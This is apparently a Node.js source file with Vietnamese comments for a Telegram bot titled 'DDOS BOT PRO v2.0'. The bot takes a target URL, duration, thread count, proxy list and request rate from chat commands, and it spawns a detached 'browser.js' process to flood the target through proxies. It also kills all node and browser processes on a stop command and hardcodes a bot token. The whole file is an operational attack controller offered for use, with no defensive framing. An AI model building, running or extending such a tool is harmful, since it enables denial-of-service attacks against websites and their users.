const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const fs = require('fs');
const chalk = require('chalk');

// === CẤU HÌNH ===
const TOKEN = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k'; // Thay bằng token thật
const DEFAULT_PROXY_FILE = 'proxy1.txt';
const bot = new TelegramBot(TOKEN, { polling: true });

// Trạng thái
let isRunning = false;
let activeProcess = null;

// Log màu
const log = (color, text) => console.log(`${color}${text}${chalk.reset}`);

// Kiểm tra file proxy
const checkProxyFile = (file) => fs.existsSync(file) && fs.statSync(file).size > 0;

// === LỆNH /start ===
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
*DDOS BOT PRO v2.0*

*Lệnh:*
/d <url> <giây> [luồng] [proxy_file] [rate]

*Ví dụ:*
/d https://example.com 60
/d https://example.com 120 10 proxy2.txt 200

*Proxy mặc định:* \`${DEFAULT_PROXY_FILE}\`
/stop → Dừng tất cả

*ok*
    `, { parse_mode: 'Markdown' });
});

// === LỆNH /d ===
bot.onText(/\/d\s+(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isRunning) return bot.sendMessage(chatId, 'Đang chạy! Dùng /stop trước.');

    const args = match[1].trim().split(/\s+/);
    let [target, duration, threads = '5', proxyFile = DEFAULT_PROXY_FILE, rate = '100'] = args;

    // Validate
    if (!/^https?:\/\//i.test(target)) {
        return bot.sendMessage(chatId, 'URL phải bắt đầu bằng http:// hoặc https://');
    }
    duration = parseInt(duration);
    if (isNaN(duration) || duration < 10) return bot.sendMessage(chatId, 'Thời gian ≥ 10 giây');

    threads = Math.min(Math.max(parseInt(threads), 1), 50) || 5;
    rate = parseInt(rate) || 100;

    // Kiểm tra proxy
    if (!checkProxyFile(proxyFile)) {
        return bot.sendMessage(chatId, `Không tìm thấy file: \`${proxyFile}\``, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: `Dùng ${DEFAULT_PROXY_FILE}`, callback_data: `use_default|${target}|${duration}|${threads}|${rate}` }
                ]]
            }
        });
    }

    runAttack(chatId, target, duration, threads, proxyFile, rate);
});

// Inline button
bot.on('callback_query', (query) => {
    if (!query.data.startsWith('use_default')) return;
    const [_, target, duration, threads, rate] = query.data.split('|');
    const chatId = query.message.chat.id;
    bot.deleteMessage(chatId, query.message.message_id);
    runAttack(chatId, target, +duration, +threads, DEFAULT_PROXY_FILE, +rate);
});

// === CHẠY TẤN CÔNG ===
const runAttack = (chatId, target, duration, threads, proxyFile, rate) => {
    bot.sendMessage(chatId, `
*Khởi chạy...*
URL: \`${target}\`
Thời gian: \`${duration}s\`
Luồng: \`${threads}\`
Proxy: \`${proxyFile}\`
Rate: \`${rate}\`
    `, { parse_mode: 'Markdown' });

    const args = [target, duration, threads, proxyFile, rate];
    activeProcess = spawn('node', ['browser.js', ...args], { detached: true, stdio: 'ignore' });
    activeProcess.unref();
    isRunning = true;

    log(chalk.green, `[BOT] Spawn: browser.js ${args.join(' ')}`);

    setTimeout(() => {
        if (isRunning) {
            bot.sendMessage(chatId, 'Thời gian chạy kết thúc.');
            isRunning = false;
        }
    }, (duration + 10) * 1000);
};

// === LỆNH /stop ===
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (!isRunning) return bot.sendMessage(chatId, 'Không có tiến trình nào.');

    require('child_process').exec('taskkill /f /im node.exe 2>nul || pkill -f node', () => {});
    require('child_process').exec('taskkill /f /im msedge.exe 2>nul || pkill -f chrome', () => {});

    isRunning = false;
    activeProcess = null;
    bot.sendMessage(chatId, '*ĐÃ DỪNG HOÀN TOÀN!*', { parse_mode: 'Markdown' });
    log(chalk.red, '[BOT] Đã kill tất cả process');
});

// Lỗi
bot.on('polling_error', (err) => log(chalk.red, `Polling error: ${err.message}`));

console.log(chalk.cyan.bold('Bot PRO v2.0 đang chạy... Gửi /start'));